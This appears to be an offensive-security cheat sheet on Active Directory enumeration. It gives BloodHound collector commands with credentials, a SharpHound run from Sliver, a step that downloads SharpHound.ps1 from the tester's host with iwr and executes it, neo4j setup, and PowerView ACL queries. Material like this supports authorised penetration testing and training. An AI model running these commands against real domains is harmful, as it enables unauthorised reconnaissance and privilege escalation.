# Enumeration

* [Bloodhound ] (#Bloodhound )


## Bloodhound 

Warning : Verify that the collector you're using match the Bloodhound version 

### Bloodhound-Python
- https://github.com/dirkjanm/BloodHound.py
- https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce

```
bloodhound-python -c all -u "<username>" -p "<password>" -d <domain> -dc <DCip> -ns <dns>
```

### From Sliver

```
sharp-hound-4 -- '-c all'
``` 

### SharpHound.ps1
- https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors


On domain session : 
```
    iwr -uri http://<yourip>/SharpHound.ps1 -outfile SharpHound.ps1
    Import-Module .\Sharphound.ps1
    Invoke-BloodHound -CollectionMethod All 
```

On your VM :
```
    sudo neo4j start
```
Log on : http://localhost:7474 
```
    MATCH (n) OPTIONAL MATCH (n)-[r]-() DELETE n,r (to delete all previous neo4j db)
```
run bloodhound on terminal and log to neo4j db
Open download folder then drag and drop “corp audit_20231223102113_BloodHound.zip”
``` 

## ACL 

### Powerview
- https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

ACLs associated with a specified object :

```
	Get-DomainObjectAcl -Identity <user> –ResolveGUIDs
	Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<strings>"}
	Find-InterestingDomainAcl -ResolveGUIDs -Domain <domain>
```
